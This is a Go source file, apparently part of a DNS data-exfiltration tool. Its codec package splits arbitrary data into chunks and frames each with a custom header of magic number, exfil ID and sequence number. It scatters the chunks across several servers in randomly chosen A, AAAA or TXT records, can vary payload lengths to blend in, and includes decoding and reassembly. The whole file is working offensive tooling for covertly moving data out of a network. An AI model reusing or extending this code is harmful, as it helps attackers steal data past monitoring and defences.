package codec

import (
	cryptorand "crypto/rand"
	"sort"

	"fmt"
	"math/rand/v2"
	"time"

	"golang.org/x/net/dns/dnsmessage"
)

// Here, we can create an "exfil builder" that can take arbitrary data (len > 0) and can encode and send
// the data servers (len servers > 0). There are a few parts to the encoder:
// - the header portion (exfil ID, sequence number, total number of packets, etc.)
// - the payload portion (the actual data being sent)
// - the footer portion (checksum, etc.)

const (
	MAGIC         uint32 = 0x583DF23F
	EXFIL_ID_SIZE int    = 7
	HEADER_SIZE   int    = 24
)

type (
	ExfilOptions struct {
		Servers            []string
		Duration           time.Duration
		AllowedRecordTypes []dnsmessage.Type
		VaryPayloadLengths bool
	}

	RequestHeader struct {
		ExfilID  [EXFIL_ID_SIZE]byte
		SeqNum   uint32
		Total    uint32
		BodySize uint32
		Flags    byte
	}

	ExfilRequest struct {
		TargetServer string
		Header       RequestHeader
		RecordType   dnsmessage.Type
		Body         []byte
	}
)

// Header format:
// Magic (4 bytes) | ExfilID (7 bytes) | SeqNum (4 bytes) | Total (4 bytes) | Body Size (4 bytes) | Flags (1 byte)
func (r *RequestHeader) ToBytes() (b [HEADER_SIZE]byte) {
	var magic uint32 = MAGIC
	b[0], b[1], b[2], b[3] = byte(magic>>24), byte(magic>>16), byte(magic>>8), byte(magic)
	copy(b[4:11], r.ExfilID[:])
	b[11], b[12], b[13], b[14] = byte(r.SeqNum>>24), byte(r.SeqNum>>16), byte(r.SeqNum>>8), byte(r.SeqNum)
	b[15], b[16], b[17], b[18] = byte(r.Total>>24), byte(r.Total>>16), byte(r.Total>>8), byte(r.Total)
	b[19], b[20], b[21], b[22] = byte(r.BodySize>>24), byte(r.BodySize>>16), byte(r.BodySize>>8), byte(r.BodySize)
	b[23] = r.Flags
	return
}

func (req *ExfilRequest) Encode() (message []byte, err error) {
	var headerBytes [HEADER_SIZE]byte = req.Header.ToBytes()
	message, err = Encode(req.RecordType, append(headerBytes[:], req.Body...))
	return
}

func GenerateUniqueID() (id [EXFIL_ID_SIZE]byte) {
	cryptorand.Read(id[:4])
	var t uint32 = uint32(time.Now().Unix())
	id[4], id[5], id[6] = byte(t>>16), byte(t>>8), byte(t)
	return
}

func EncodeExfilRequest(data []byte, opts ExfilOptions) (requests []ExfilRequest, err error) {
	if len(data) == 0 {
		err = fmt.Errorf("data must be non-empty")
		return
	}

	if len(opts.Servers) == 0 {
		err = fmt.Errorf("at least one server must be specified")
		return
	}

	if opts.Duration <= 0 {
		err = fmt.Errorf("duration must be greater than zero")
		return
	}

	if len(opts.AllowedRecordTypes) == 0 {
		opts.AllowedRecordTypes = []dnsmessage.Type{dnsmessage.TypeA, dnsmessage.TypeAAAA, dnsmessage.TypeTXT}
	}

	// Consume data into chunks
	var header RequestHeader
	header.ExfilID = GenerateUniqueID()

	for len(data) > 0 {
		var (
			recordType dnsmessage.Type = opts.AllowedRecordTypes[rand.IntN(len(opts.AllowedRecordTypes))]
			chunkSize  int             = EncodeableTypes[recordType].MaxPayloadLength - HEADER_SIZE
		)

		chunkSize = min(chunkSize, len(data))
		if opts.VaryPayloadLengths {
			chunkSize = rand.IntN(chunkSize) + 1
		}

		requests = append(requests, ExfilRequest{
			TargetServer: opts.Servers[rand.IntN(len(opts.Servers))],
			RecordType:   recordType,
			Body:         data[:chunkSize],
		})

		data = data[chunkSize:]
	}

	header.Total = uint32(len(requests))
	for i := range requests {
		requests[i].Header = RequestHeader{
			ExfilID:  header.ExfilID,
			SeqNum:   uint32(i),
			Total:    header.Total,
			BodySize: uint32(len(requests[i].Body)),
			Flags:    0,
		}
	}

	return
}

func DecodeExfilRequest(message []byte) (request ExfilRequest, err error) {
	if request.RecordType, message, err = Decode(message); err != nil {
		return
	}

	if len(message) < HEADER_SIZE {
		err = fmt.Errorf("message is too short to contain a valid header")
		return
	}

	{ // Header
		var magic uint32 = uint32(message[0])<<24 | uint32(message[1])<<16 | uint32(message[2])<<8 | uint32(message[3])
		if magic != MAGIC {
			err = fmt.Errorf("invalid magic number: expected %x, got %x", MAGIC, magic)
			return
		}

		copy(request.Header.ExfilID[:], message[4:11])
		request.Header.SeqNum = uint32(message[11])<<24 | uint32(message[12])<<16 | uint32(message[13])<<8 | uint32(message[14])
		request.Header.Total = uint32(message[15])<<24 | uint32(message[16])<<16 | uint32(message[17])<<8 | uint32(message[18])
		request.Header.BodySize = uint32(message[19])<<24 | uint32(message[20])<<16 | uint32(message[21])<<8 | uint32(message[22])
		request.Header.Flags = message[23]
	}

	if len(message) < HEADER_SIZE+int(request.Header.BodySize) {
		err = fmt.Errorf("message is too short to contain the specified body size")
		return
	}

	request.Body = message[HEADER_SIZE : HEADER_SIZE+int(request.Header.BodySize)]
	return
}

func RebuildExfilData(requests []ExfilRequest) (data []byte, err error) {
	if len(requests) == 0 {
		err = fmt.Errorf("no requests provided")
		return
	}

	// Sort requests by sequence number, require complete set of sequence numbers
	sort.Slice(requests, func(i, j int) bool {
		return requests[i].Header.SeqNum < requests[j].Header.SeqNum
	})

	var expectedTotal uint32 = requests[0].Header.Total
	if expectedTotal != uint32(len(requests)) {
		err = fmt.Errorf("incomplete set of requests: expected %d, got %d", expectedTotal, len(requests))
		return
	}

	for i, req := range requests {
		if req.Header.SeqNum != uint32(i) {
			err = fmt.Errorf("missing request with sequence number %d", i)
			return
		}

		data = append(data, req.Body...)
	}

	return
}
